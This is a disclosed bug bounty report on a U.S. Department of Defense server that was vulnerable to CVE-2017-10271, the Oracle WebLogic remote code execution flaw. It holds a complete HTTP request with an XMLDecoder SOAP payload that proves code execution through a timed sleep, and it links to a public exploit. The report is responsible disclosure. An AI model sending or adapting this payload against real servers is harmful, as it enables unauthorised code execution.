@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/576887
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/erbbysam
+ReportedTo:U.S. Dept Of Defense(deptofdefense)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:01.07.2019 19:54:20
+
+Summary:
+
+**Summary:**
+Happy Friday! The server at `██████` is vulnerable to CVE-2017-10271 "Oracle WebLogic Server Remote Command Execution".
+
+**Description:**
+The following request takes 12 seconds (12000 milliseconds) to complete:
+```
+POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
+Host: ██████████
+Content-Length: 423
+content-type: text/xml
+Accept-Encoding: gzip, deflate, compress
+Accept: */*
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java class="java.beans.XMLDecoder">
+        <object class="java.lang.Thread" method="sleep">
+          <long>12000</long>
+        </object>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
+```
+This proves that I have Java code execution on the remote server. 
+
+ref: https://techblog.mediaservice.net/2018/07/cve-2017-10271-oracle-weblogic-server-remote-command-execution-sleep-detection-payload/
+
+Public exploits for this exist: https://github.com/c0mmand3rOpSec/CVE-2017-10271
+I was not able to use that script with a `ping` command, which might have been blocked by preventing outbound connections.
+
+## Suggested Mitigation/Remediation Actions
+Patch & possibly don't allow external access.
+
+## Impact
+
+Critical, RCE.
